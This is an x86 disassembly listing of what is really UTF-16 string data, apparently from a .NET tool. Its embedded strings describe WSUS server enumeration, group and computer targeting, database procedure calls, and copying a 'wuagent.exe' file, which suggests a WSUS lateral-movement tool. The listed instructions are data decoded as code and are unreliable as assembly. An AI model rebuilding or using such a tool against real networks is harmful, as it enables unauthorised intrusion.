  40a6f7:	00 23                	add    %ah,(%ebx)
  40a6f9:	00 23                	add    %ah,(%ebx)
  40a6fb:	00 23                	add    %ah,(%ebx)
  40a6fd:	00 23                	add    %ah,(%ebx)
  40a6ff:	00 23                	add    %ah,(%ebx)
  40a701:	00 23                	add    %ah,(%ebx)
  40a703:	00 23                	add    %ah,(%ebx)
  40a705:	00 23                	add    %ah,(%ebx)
  40a707:	00 20                	add    %ah,(%eax)
  40a709:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a70d:	00 77 00             	add    %dh,0x0(%edi)
  40a710:	6e                   	outsb  %ds:(%esi),(%dx)
  40a711:	00 73 00             	add    %dh,0x0(%ebx)
  40a714:	74 00                	je     0x40a716
  40a716:	72 00                	jb     0x40a718
  40a718:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a71c:	6d                   	insl   (%dx),%es:(%edi)
  40a71d:	00 20                	add    %ah,(%eax)
  40a71f:	00 53 00             	add    %dl,0x0(%ebx)
  40a722:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a726:	76 00                	jbe    0x40a728
  40a728:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a72c:	20 00                	and    %al,(%eax)
  40a72e:	45                   	inc    %ebp
  40a72f:	00 6e 00             	add    %ch,0x0(%esi)
  40a732:	75 00                	jne    0x40a734
  40a734:	6d                   	insl   (%dx),%es:(%edi)
  40a735:	00 65 00             	add    %ah,0x0(%ebp)
  40a738:	72 00                	jb     0x40a73a
  40a73a:	61                   	popa
  40a73b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a73f:	00 6f 00             	add    %ch,0x0(%edi)
  40a742:	6e                   	outsb  %ds:(%esi),(%dx)
  40a743:	00 20                	add    %ah,(%eax)
  40a745:	00 23                	add    %ah,(%ebx)
  40a747:	00 23                	add    %ah,(%ebx)
  40a749:	00 23                	add    %ah,(%ebx)
  40a74b:	00 23                	add    %ah,(%ebx)
  40a74d:	00 23                	add    %ah,(%ebx)
  40a74f:	00 23                	add    %ah,(%ebx)
  40a751:	00 23                	add    %ah,(%ebx)
  40a753:	00 23                	add    %ah,(%ebx)
  40a755:	00 23                	add    %ah,(%ebx)
  40a757:	00 23                	add    %ah,(%ebx)
  40a759:	00 23                	add    %ah,(%ebx)
  40a75b:	00 23                	add    %ah,(%ebx)
  40a75d:	00 23                	add    %ah,(%ebx)
  40a75f:	00 23                	add    %ah,(%ebx)
  40a761:	00 23                	add    %ah,(%ebx)
  40a763:	00 23                	add    %ah,(%ebx)
  40a765:	00 23                	add    %ah,(%ebx)
  40a767:	00 23                	add    %ah,(%ebx)
  40a769:	00 23                	add    %ah,(%ebx)
  40a76b:	00 23                	add    %ah,(%ebx)
  40a76d:	00 23                	add    %ah,(%ebx)
  40a76f:	00 23                	add    %ah,(%ebx)
  40a771:	00 23                	add    %ah,(%ebx)
  40a773:	00 00                	add    %al,(%eax)
  40a775:	51                   	push   %ecx
  40a776:	43                   	inc    %ebx
  40a777:	00 6f 00             	add    %ch,0x0(%edi)
  40a77a:	6d                   	insl   (%dx),%es:(%edi)
  40a77b:	00 70 00             	add    %dh,0x0(%eax)
  40a77e:	75 00                	jne    0x40a780
  40a780:	74 00                	je     0x40a782
  40a782:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a786:	4e                   	dec    %esi
  40a787:	00 61 00             	add    %ah,0x0(%ecx)
  40a78a:	6d                   	insl   (%dx),%es:(%edi)
  40a78b:	00 65 00             	add    %ah,0x0(%ebp)
  40a78e:	2c 00                	sub    $0x0,%al
  40a790:	20 00                	and    %al,(%eax)
  40a792:	4f                   	dec    %edi
  40a793:	00 53 00             	add    %dl,0x0(%ebx)
  40a796:	56                   	push   %esi
  40a797:	00 65 00             	add    %ah,0x0(%ebp)
  40a79a:	72 00                	jb     0x40a79c
  40a79c:	73 00                	jae    0x40a79e
  40a79e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a7a4:	2c 00                	sub    $0x0,%al
  40a7a6:	20 00                	and    %al,(%eax)
  40a7a8:	4c                   	dec    %esp
  40a7a9:	00 61 00             	add    %ah,0x0(%ecx)
  40a7ac:	73 00                	jae    0x40a7ae
  40a7ae:	74 00                	je     0x40a7b0
  40a7b0:	43                   	inc    %ebx
  40a7b1:	00 68 00             	add    %ch,0x0(%eax)
  40a7b4:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a7b8:	6b 00 49             	imul   $0x49,(%eax),%eax
  40a7bb:	00 6e 00             	add    %ch,0x0(%esi)
  40a7be:	54                   	push   %esp
  40a7bf:	00 69 00             	add    %ch,0x0(%ecx)
  40a7c2:	6d                   	insl   (%dx),%es:(%edi)
  40a7c3:	00 65 00             	add    %ah,0x0(%ebp)
  40a7c6:	00 1b                	add    %bl,(%ebx)
  40a7c8:	7b 00                	jnp    0x40a7ca
  40a7ca:	30 00                	xor    %al,(%eax)
  40a7cc:	7d 00                	jge    0x40a7ce
  40a7ce:	2c 00                	sub    $0x0,%al
  40a7d0:	20 00                	and    %al,(%eax)
  40a7d2:	7b 00                	jnp    0x40a7d4
  40a7d4:	31 00                	xor    %eax,(%eax)
  40a7d6:	7d 00                	jge    0x40a7d8
  40a7d8:	2c 00                	sub    $0x0,%al
  40a7da:	20 00                	and    %al,(%eax)
  40a7dc:	7b 00                	jnp    0x40a7de
  40a7de:	32 00                	xor    (%eax),%al
  40a7e0:	7d 00                	jge    0x40a7e2
  40a7e2:	00 17                	add    %dl,(%edi)
  40a7e4:	41                   	inc    %ecx
  40a7e5:	00 63 00             	add    %ah,0x0(%ebx)
  40a7e8:	63 00                	arpl   %eax,(%eax)
  40a7ea:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7eb:	00 75 00             	add    %dh,0x0(%ebp)
  40a7ee:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7ef:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40a7f3:	00 61 00             	add    %ah,0x0(%ecx)
  40a7f6:	6d                   	insl   (%dx),%es:(%edi)
  40a7f7:	00 65 00             	add    %ah,0x0(%ebp)
  40a7fa:	00 0f                	add    %cl,(%edi)
  40a7fc:	56                   	push   %esi
  40a7fd:	00 65 00             	add    %ah,0x0(%ebp)
  40a800:	72 00                	jb     0x40a802
  40a802:	73 00                	jae    0x40a804
  40a804:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a80a:	00 25 52 00 6f 00    	add    %ah,0x6f0052
  40a810:	6c                   	insb   (%dx),%es:(%edi)
  40a811:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40a815:	00 70 00             	add    %dh,0x0(%eax)
  40a818:	4c                   	dec    %esp
  40a819:	00 61 00             	add    %ah,0x0(%ecx)
  40a81c:	73 00                	jae    0x40a81e
  40a81e:	74 00                	je     0x40a820
  40a820:	53                   	push   %ebx
  40a821:	00 79 00             	add    %bh,0x0(%ecx)
  40a824:	6e                   	outsb  %ds:(%esi),(%dx)
  40a825:	00 63 00             	add    %ah,0x0(%ebx)
  40a828:	54                   	push   %esp
  40a829:	00 69 00             	add    %ch,0x0(%ecx)
  40a82c:	6d                   	insl   (%dx),%es:(%edi)
  40a82d:	00 65 00             	add    %ah,0x0(%ebp)
  40a830:	00 49 0d             	add    %cl,0xd(%ecx)
  40a833:	00 0a                	add    %cl,(%edx)
  40a835:	00 46 00             	add    %al,0x0(%esi)
  40a838:	75 00                	jne    0x40a83a
  40a83a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a83b:	00 63 00             	add    %ah,0x0(%ebx)
  40a83e:	74 00                	je     0x40a840
  40a840:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a846:	20 00                	and    %al,(%eax)
  40a848:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a84c:	72 00                	jb     0x40a84e
  40a84e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a84f:	00 72 00             	add    %dh,0x0(%edx)
  40a852:	20 00                	and    %al,(%eax)
  40a854:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40a859:	00 62 00             	add    %ah,0x0(%edx)
  40a85c:	45                   	inc    %ebp
  40a85d:	00 6e 00             	add    %ch,0x0(%esi)
  40a860:	75 00                	jne    0x40a862
  40a862:	6d                   	insl   (%dx),%es:(%edi)
  40a863:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a867:	00 77 00             	add    %dh,0x0(%edi)
  40a86a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a86b:	00 53 00             	add    %dl,0x0(%ebx)
  40a86e:	74 00                	je     0x40a870
  40a870:	72 00                	jb     0x40a872
  40a872:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a876:	6d                   	insl   (%dx),%es:(%edi)
  40a877:	00 2e                	add    %ch,(%esi)
  40a879:	00 01                	add    %al,(%ecx)
  40a87b:	33 65 00             	xor    0x0(%ebp),%esp
  40a87e:	78 00                	js     0x40a880
  40a880:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a884:	20 00                	and    %al,(%eax)
  40a886:	73 00                	jae    0x40a888
  40a888:	70 00                	jo     0x40a88a
  40a88a:	47                   	inc    %edi
  40a88b:	00 65 00             	add    %ah,0x0(%ebp)
  40a88e:	74 00                	je     0x40a890
  40a890:	41                   	inc    %ecx
  40a891:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a895:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40a899:	00 72 00             	add    %dh,0x0(%edx)
  40a89c:	67 00 65 00          	add    %ah,0x0(%di)
  40a8a0:	74 00                	je     0x40a8a2
  40a8a2:	47                   	inc    %edi
  40a8a3:	00 72 00             	add    %dh,0x0(%edx)
  40a8a6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8a7:	00 75 00             	add    %dh,0x0(%ebp)
  40a8aa:	70 00                	jo     0x40a8ac
  40a8ac:	73 00                	jae    0x40a8ae
  40a8ae:	00 80 87 0d 00 0a    	add    %al,0xa000d87(%eax)
  40a8b4:	00 23                	add    %ah,(%ebx)
  40a8b6:	00 23                	add    %ah,(%ebx)
  40a8b8:	00 23                	add    %ah,(%ebx)
  40a8ba:	00 23                	add    %ah,(%ebx)
  40a8bc:	00 23                	add    %ah,(%ebx)
  40a8be:	00 23                	add    %ah,(%ebx)
  40a8c0:	00 23                	add    %ah,(%ebx)
  40a8c2:	00 23                	add    %ah,(%ebx)
  40a8c4:	00 23                	add    %ah,(%ebx)
  40a8c6:	00 23                	add    %ah,(%ebx)
  40a8c8:	00 23                	add    %ah,(%ebx)
  40a8ca:	00 23                	add    %ah,(%ebx)
  40a8cc:	00 23                	add    %ah,(%ebx)
  40a8ce:	00 23                	add    %ah,(%ebx)
  40a8d0:	00 23                	add    %ah,(%ebx)
  40a8d2:	00 23                	add    %ah,(%ebx)
  40a8d4:	00 23                	add    %ah,(%ebx)
  40a8d6:	00 23                	add    %ah,(%ebx)
  40a8d8:	00 23                	add    %ah,(%ebx)
  40a8da:	00 23                	add    %ah,(%ebx)
  40a8dc:	00 23                	add    %ah,(%ebx)
  40a8de:	00 23                	add    %ah,(%ebx)
  40a8e0:	00 23                	add    %ah,(%ebx)
  40a8e2:	00 20                	add    %ah,(%eax)
  40a8e4:	00 47 00             	add    %al,0x0(%edi)
  40a8e7:	72 00                	jb     0x40a8e9
  40a8e9:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8ea:	00 75 00             	add    %dh,0x0(%ebp)
  40a8ed:	70 00                	jo     0x40a8ef
  40a8ef:	20 00                	and    %al,(%eax)
  40a8f1:	45                   	inc    %ebp
  40a8f2:	00 6e 00             	add    %ch,0x0(%esi)
  40a8f5:	75 00                	jne    0x40a8f7
  40a8f7:	6d                   	insl   (%dx),%es:(%edi)
  40a8f8:	00 65 00             	add    %ah,0x0(%ebp)
  40a8fb:	72 00                	jb     0x40a8fd
  40a8fd:	61                   	popa
  40a8fe:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a902:	00 6f 00             	add    %ch,0x0(%edi)
  40a905:	6e                   	outsb  %ds:(%esi),(%dx)
  40a906:	00 20                	add    %ah,(%eax)
  40a908:	00 23                	add    %ah,(%ebx)
  40a90a:	00 23                	add    %ah,(%ebx)
  40a90c:	00 23                	add    %ah,(%ebx)
  40a90e:	00 23                	add    %ah,(%ebx)
  40a910:	00 23                	add    %ah,(%ebx)
  40a912:	00 23                	add    %ah,(%ebx)
  40a914:	00 23                	add    %ah,(%ebx)
  40a916:	00 23                	add    %ah,(%ebx)
  40a918:	00 23                	add    %ah,(%ebx)
  40a91a:	00 23                	add    %ah,(%ebx)
  40a91c:	00 23                	add    %ah,(%ebx)
  40a91e:	00 23                	add    %ah,(%ebx)
  40a920:	00 23                	add    %ah,(%ebx)
  40a922:	00 23                	add    %ah,(%ebx)
  40a924:	00 23                	add    %ah,(%ebx)
  40a926:	00 23                	add    %ah,(%ebx)
  40a928:	00 23                	add    %ah,(%ebx)
  40a92a:	00 23                	add    %ah,(%ebx)
  40a92c:	00 23                	add    %ah,(%ebx)
  40a92e:	00 23                	add    %ah,(%ebx)
  40a930:	00 23                	add    %ah,(%ebx)
  40a932:	00 23                	add    %ah,(%ebx)
  40a934:	00 23                	add    %ah,(%ebx)
  40a936:	00 00                	add    %al,(%eax)
  40a938:	13 47 00             	adc    0x0(%edi),%eax
  40a93b:	72 00                	jb     0x40a93d
  40a93d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a93e:	00 75 00             	add    %dh,0x0(%ebp)
  40a941:	70 00                	jo     0x40a943
  40a943:	4e                   	dec    %esi
  40a944:	00 61 00             	add    %ah,0x0(%ecx)
  40a947:	6d                   	insl   (%dx),%es:(%edi)
  40a948:	00 65 00             	add    %ah,0x0(%ebp)
  40a94b:	00 07                	add    %al,(%edi)
  40a94d:	7b 00                	jnp    0x40a94f
  40a94f:	30 00                	xor    %al,(%eax)
  40a951:	7d 00                	jge    0x40a953
  40a953:	00 09                	add    %cl,(%ecx)
  40a955:	4e                   	dec    %esi
  40a956:	00 61 00             	add    %ah,0x0(%ecx)
  40a959:	6d                   	insl   (%dx),%es:(%edi)
  40a95a:	00 65 00             	add    %ah,0x0(%ebp)
  40a95d:	00 41 0d             	add    %al,0xd(%ecx)
  40a960:	00 0a                	add    %cl,(%edx)
  40a962:	00 46 00             	add    %al,0x0(%esi)
  40a965:	75 00                	jne    0x40a967
  40a967:	6e                   	outsb  %ds:(%esi),(%dx)
  40a968:	00 63 00             	add    %ah,0x0(%ebx)
  40a96b:	74 00                	je     0x40a96d
  40a96d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a973:	20 00                	and    %al,(%eax)
  40a975:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a979:	72 00                	jb     0x40a97b
  40a97b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a97c:	00 72 00             	add    %dh,0x0(%edx)
  40a97f:	20 00                	and    %al,(%eax)
  40a981:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40a986:	00 62 00             	add    %ah,0x0(%edx)
  40a989:	45                   	inc    %ebp
  40a98a:	00 6e 00             	add    %ch,0x0(%esi)
  40a98d:	75 00                	jne    0x40a98f
  40a98f:	6d                   	insl   (%dx),%es:(%edi)
  40a990:	00 47 00             	add    %al,0x0(%edi)
  40a993:	72 00                	jb     0x40a995
  40a995:	6f                   	outsl  %ds:(%esi),(%dx)
  40a996:	00 75 00             	add    %dh,0x0(%ebp)
  40a999:	70 00                	jo     0x40a99b
  40a99b:	73 00                	jae    0x40a99d
  40a99d:	2e 00 01             	add    %al,%cs:(%ecx)
  40a9a0:	80 89 48 00 4b 00 45 	orb    $0x45,0x4b0048(%ecx)
  40a9a7:	00 59 00             	add    %bl,0x0(%ecx)
  40a9aa:	5f                   	pop    %edi
  40a9ab:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40a9af:	00 43 00             	add    %al,0x0(%ebx)
  40a9b2:	41                   	inc    %ecx
  40a9b3:	00 4c 00 5f          	add    %cl,0x5f(%eax,%eax,1)
  40a9b7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9ba:	41                   	inc    %ecx
  40a9bb:	00 43 00             	add    %al,0x0(%ebx)
  40a9be:	48                   	dec    %eax
  40a9bf:	00 49 00             	add    %cl,0x0(%ecx)
  40a9c2:	4e                   	dec    %esi
  40a9c3:	00 45 00             	add    %al,0x0(%ebp)
  40a9c6:	5c                   	pop    %esp
  40a9c7:	00 53 00             	add    %dl,0x0(%ebx)
  40a9ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9cb:	00 66 00             	add    %ah,0x0(%esi)
  40a9ce:	74 00                	je     0x40a9d0
  40a9d0:	77 00                	ja     0x40a9d2
  40a9d2:	61                   	popa
  40a9d3:	00 72 00             	add    %dh,0x0(%edx)
  40a9d6:	65 00 5c 00 50       	add    %bl,%gs:0x50(%eax,%eax,1)
  40a9db:	00 6f 00             	add    %ch,0x0(%edi)
  40a9de:	6c                   	insb   (%dx),%es:(%edi)
  40a9df:	00 69 00             	add    %ch,0x0(%ecx)
  40a9e2:	63 00                	arpl   %eax,(%eax)
  40a9e4:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40a9ea:	5c                   	pop    %esp
  40a9eb:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9ee:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40a9f4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9f5:	00 73 00             	add    %dh,0x0(%ebx)
  40a9f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9f9:	00 66 00             	add    %ah,0x0(%esi)
  40a9fc:	74 00                	je     0x40a9fe
  40a9fe:	5c                   	pop    %esp
  40a9ff:	00 57 00             	add    %dl,0x0(%edi)
  40aa02:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40aa08:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa09:	00 77 00             	add    %dh,0x0(%edi)
  40aa0c:	73 00                	jae    0x40aa0e
  40aa0e:	5c                   	pop    %esp
  40aa0f:	00 57 00             	add    %dl,0x0(%edi)
  40aa12:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40aa18:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa19:	00 77 00             	add    %dh,0x0(%edi)
  40aa1c:	73 00                	jae    0x40aa1e
  40aa1e:	55                   	push   %ebp
  40aa1f:	00 70 00             	add    %dh,0x0(%eax)
  40aa22:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40aa26:	74 00                	je     0x40aa28
  40aa28:	65 00 00             	add    %al,%gs:(%eax)
  40aa2b:	11 57 00             	adc    %edx,0x0(%edi)
  40aa2e:	55                   	push   %ebp
  40aa2f:	00 53 00             	add    %dl,0x0(%ebx)
  40aa32:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40aa36:	76 00                	jbe    0x40aa38
  40aa38:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40aa3c:	00 39                	add    %bh,(%ecx)
  40aa3e:	57                   	push   %edi
  40aa3f:	00 53 00             	add    %dl,0x0(%ebx)
  40aa42:	55                   	push   %ebp
  40aa43:	00 53 00             	add    %dl,0x0(%ebx)
  40aa46:	20 00                	and    %al,(%eax)
  40aa48:	52                   	push   %edx
  40aa49:	00 65 00             	add    %ah,0x0(%ebp)
  40aa4c:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40aa50:	73 00                	jae    0x40aa52
  40aa52:	74 00                	je     0x40aa54
  40aa54:	72 00                	jb     0x40aa56
  40aa56:	79 00                	jns    0x40aa58
  40aa58:	20 00                	and    %al,(%eax)
  40aa5a:	4b                   	dec    %ebx
  40aa5b:	00 65 00             	add    %ah,0x0(%ebp)
  40aa5e:	79 00                	jns    0x40aa60
  40aa60:	20 00                	and    %al,(%eax)
  40aa62:	4e                   	dec    %esi
  40aa63:	00 6f 00             	add    %ch,0x0(%edi)
  40aa66:	74 00                	je     0x40aa68
  40aa68:	20 00                	and    %al,(%eax)
  40aa6a:	46                   	inc    %esi
  40aa6b:	00 6f 00             	add    %ch,0x0(%edi)
  40aa6e:	75 00                	jne    0x40aa70
  40aa70:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa71:	00 64 00 21          	add    %ah,0x21(%eax,%eax,1)
  40aa75:	00 00                	add    %al,(%eax)
  40aa77:	21 57 00             	and    %edx,0x0(%edi)
  40aa7a:	53                   	push   %ebx
  40aa7b:	00 55 00             	add    %dl,0x0(%ebp)
  40aa7e:	53                   	push   %ebx
  40aa7f:	00 20                	add    %ah,(%eax)
  40aa81:	00 53 00             	add    %dl,0x0(%ebx)
  40aa84:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40aa88:	76 00                	jbe    0x40aa8a
  40aa8a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40aa8e:	3a 00                	cmp    (%eax),%al
  40aa90:	20 00                	and    %al,(%eax)
  40aa92:	7b 00                	jnp    0x40aa94
  40aa94:	30 00                	xor    %al,(%eax)
  40aa96:	7d 00                	jge    0x40aa98
  40aa98:	00 47 0d             	add    %al,0xd(%edi)
  40aa9b:	00 0a                	add    %cl,(%edx)
  40aa9d:	00 46 00             	add    %al,0x0(%esi)
  40aaa0:	75 00                	jne    0x40aaa2
  40aaa2:	6e                   	outsb  %ds:(%esi),(%dx)
  40aaa3:	00 63 00             	add    %ah,0x0(%ebx)
  40aaa6:	74 00                	je     0x40aaa8
  40aaa8:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40aaae:	20 00                	and    %al,(%eax)
  40aab0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40aab4:	72 00                	jb     0x40aab6
  40aab6:	6f                   	outsl  %ds:(%esi),(%dx)
  40aab7:	00 72 00             	add    %dh,0x0(%edx)
  40aaba:	20 00                	and    %al,(%eax)
  40aabc:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40aac1:	00 62 00             	add    %ah,0x0(%edx)
  40aac4:	47                   	inc    %edi
  40aac5:	00 65 00             	add    %ah,0x0(%ebp)
  40aac8:	74 00                	je     0x40aaca
  40aaca:	57                   	push   %edi
  40aacb:	00 53 00             	add    %dl,0x0(%ebx)
  40aace:	55                   	push   %ebp
  40aacf:	00 53 00             	add    %dl,0x0(%ebx)
  40aad2:	53                   	push   %ebx
  40aad3:	00 65 00             	add    %ah,0x0(%ebp)
  40aad6:	72 00                	jb     0x40aad8
  40aad8:	76 00                	jbe    0x40aada
  40aada:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40aade:	2e 00 01             	add    %al,%cs:(%ecx)
  40aae1:	19 5c 00 77          	sbb    %ebx,0x77(%eax,%eax,1)
  40aae5:	00 75 00             	add    %dh,0x0(%ebp)
  40aae8:	61                   	popa
  40aae9:	00 67 00             	add    %ah,0x0(%edi)
  40aaec:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40aaf0:	74 00                	je     0x40aaf2
  40aaf2:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40aaf6:	78 00                	js     0x40aaf8
  40aaf8:	65 00 00             	add    %al,%gs:(%eax)
  40aafb:	3d 0d 00 0a 00       	cmp    $0xa000d,%eax
  40ab00:	46                   	inc    %esi
  40ab01:	00 75 00             	add    %dh,0x0(%ebp)
  40ab04:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab05:	00 63 00             	add    %ah,0x0(%ebx)
  40ab08:	74 00                	je     0x40ab0a
  40ab0a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ab10:	20 00                	and    %al,(%eax)
  40ab12:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ab16:	72 00                	jb     0x40ab18
  40ab18:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab19:	00 72 00             	add    %dh,0x0(%edx)
  40ab1c:	20 00                	and    %al,(%eax)
  40ab1e:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40ab23:	00 62 00             	add    %ah,0x0(%edx)
  40ab26:	43                   	inc    %ebx
  40ab27:	00 6f 00             	add    %ch,0x0(%edi)
  40ab2a:	70 00                	jo     0x40ab2c
  40ab2c:	79 00                	jns    0x40ab2e
  40ab2e:	46                   	inc    %esi
  40ab2f:	00 69 00             	add    %ch,0x0(%ecx)
  40ab32:	6c                   	insb   (%dx),%es:(%edi)
  40ab33:	00 65 00             	add    %ah,0x0(%ebp)
  40ab36:	2e 00 01             	add    %al,%cs:(%ecx)
  40ab39:	67 65 00 78 00       	add    %bh,%gs:0x0(%bx,%si)
  40ab3e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40ab42:	20 00                	and    %al,(%eax)
  40ab44:	73 00                	jae    0x40ab46
  40ab46:	70 00                	jo     0x40ab48
  40ab48:	47                   	inc    %edi
  40ab49:	00 65 00             	add    %ah,0x0(%ebp)
  40ab4c:	74 00                	je     0x40ab4e
  40ab4e:	43                   	inc    %ebx
  40ab4f:	00 6f 00             	add    %ch,0x0(%edi)
  40ab52:	6d                   	insl   (%dx),%es:(%edi)
  40ab53:	00 70 00             	add    %dh,0x0(%eax)
  40ab56:	75 00                	jne    0x40ab58
  40ab58:	74 00                	je     0x40ab5a
  40ab5a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ab5e:	54                   	push   %esp
  40ab5f:	00 61 00             	add    %ah,0x0(%ecx)
  40ab62:	72 00                	jb     0x40ab64
  40ab64:	67 00 65 00          	add    %ah,0x0(%di)
  40ab68:	74 00                	je     0x40ab6a
  40ab6a:	42                   	inc    %edx
  40ab6b:	00 79 00             	add    %bh,0x0(%ecx)
  40ab6e:	4e                   	dec    %esi
  40ab6f:	00 61 00             	add    %ah,0x0(%ecx)
  40ab72:	6d                   	insl   (%dx),%es:(%edi)
  40ab73:	00 65 00             	add    %ah,0x0(%ebp)
  40ab76:	20 00                	and    %al,(%eax)
  40ab78:	40                   	inc    %eax
  40ab79:	00 66 00             	add    %ah,0x0(%esi)
  40ab7c:	75 00                	jne    0x40ab7e
  40ab7e:	6c                   	insb   (%dx),%es:(%edi)
  40ab7f:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40ab83:	00 6f 00             	add    %ch,0x0(%edi)
  40ab86:	6d                   	insl   (%dx),%es:(%edi)
  40ab87:	00 61 00             	add    %ah,0x0(%ecx)
  40ab8a:	69 00 6e 00 4e 00    	imul   $0x4e006e,(%eax),%eax
  40ab90:	61                   	popa
  40ab91:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab94:	65 00 20             	add    %ah,%gs:(%eax)
  40ab97:	00 3d 00 20 00 4e    	add    %bh,0x4e002000
  40ab9d:	00 27                	add    %ah,(%edi)
  40ab9f:	00 01                	add    %al,(%ecx)
  40aba1:	03 27                	add    (%edi),%esp
  40aba3:	00 01                	add    %al,(%ecx)
  40aba5:	1f                   	pop    %ds
  40aba6:	0d 00 0a 00 54       	or     $0x54000a00,%eax
  40abab:	00 61 00             	add    %ah,0x0(%ecx)
  40abae:	72 00                	jb     0x40abb0
  40abb0:	67 00 65 00          	add    %ah,0x0(%di)
  40abb4:	74 00                	je     0x40abb6
  40abb6:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40abbc:	20 00                	and    %al,(%eax)
  40abbe:	7b 00                	jnp    0x40abc0
  40abc0:	30 00                	xor    %al,(%eax)
  40abc2:	7d 00                	jge    0x40abc4
  40abc4:	00 49 54             	add    %cl,0x54(%ecx)
  40abc7:	00 61 00             	add    %ah,0x0(%ecx)
  40abca:	72 00                	jb     0x40abcc
  40abcc:	67 00 65 00          	add    %ah,0x0(%di)
  40abd0:	74 00                	je     0x40abd2
  40abd2:	43                   	inc    %ebx
  40abd3:	00 6f 00             	add    %ch,0x0(%edi)
  40abd6:	6d                   	insl   (%dx),%es:(%edi)
  40abd7:	00 70 00             	add    %dh,0x0(%eax)
  40abda:	75 00                	jne    0x40abdc
  40abdc:	74 00                	je     0x40abde
  40abde:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40abe2:	2c 00                	sub    $0x0,%al
  40abe4:	20 00                	and    %al,(%eax)
  40abe6:	43                   	inc    %ebx
  40abe7:	00 6f 00             	add    %ch,0x0(%edi)
  40abea:	6d                   	insl   (%dx),%es:(%edi)
  40abeb:	00 70 00             	add    %dh,0x0(%eax)
  40abee:	75 00                	jne    0x40abf0
  40abf0:	74 00                	je     0x40abf2
  40abf2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40abf6:	49                   	dec    %ecx
  40abf7:	00 44 00 2c          	add    %al,0x2c(%eax,%eax,1)
  40abfb:	00 20                	add    %ah,(%eax)
  40abfd:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40ac01:	00 72 00             	add    %dh,0x0(%edx)
  40ac04:	67 00 65 00          	add    %ah,0x0(%di)
  40ac08:	74 00                	je     0x40ac0a
  40ac0a:	49                   	dec    %ecx
  40ac0b:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ac0f:	49                   	dec    %ecx
  40ac10:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  40ac15:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40ac1b:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40ac21:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40ac27:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40ac2d:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40ac33:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
